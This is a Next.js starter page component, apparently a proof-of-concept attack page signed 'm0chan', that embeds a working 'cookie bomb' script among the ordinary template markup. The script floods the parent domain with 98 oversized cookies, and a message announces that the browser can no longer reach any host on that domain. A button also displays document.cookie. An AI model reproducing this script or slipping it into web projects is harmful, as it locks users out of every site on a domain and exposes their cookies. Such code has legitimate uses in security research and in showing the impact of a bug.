import Head from 'next/head'
import Header from '@components/Header'
import Footer from '@components/Footer'

export default function Home() {
  return (
    <div className="container">
      <Head>
        <title>Next.js Starter!</title>
        <link rel="icon" href="/favicon.ico" />
      </Head>

      <main>
        <Header title="Welcome to my app! - m0chan" />
    <script>
        function cookiebomb(){
                var d = document.domain.split(".").splice(-2).join(".");
                var pollution = Array(4000).join('a');
                for(var i=1;i<99;i++){
                        document.cookie='bomb'+i+'='+pollution+';Domain='+d+';Path=/';
                }
                setTimeout(()=>{alert("Cookie bomb complete! You can no longer access any host on "+d+" in your browser.")}, 1000);
        }
    </script>
    <button onclick="alert(document.cookie)">Alert</button><br><br>
    <button onclick="cookiebomb()">Cookie bomb</button><br><br>
        <p className="description">
          Get started by editing <code>pages/index.js</code>
        </p>
      </main>

      <Footer />
    </div>
  )
}
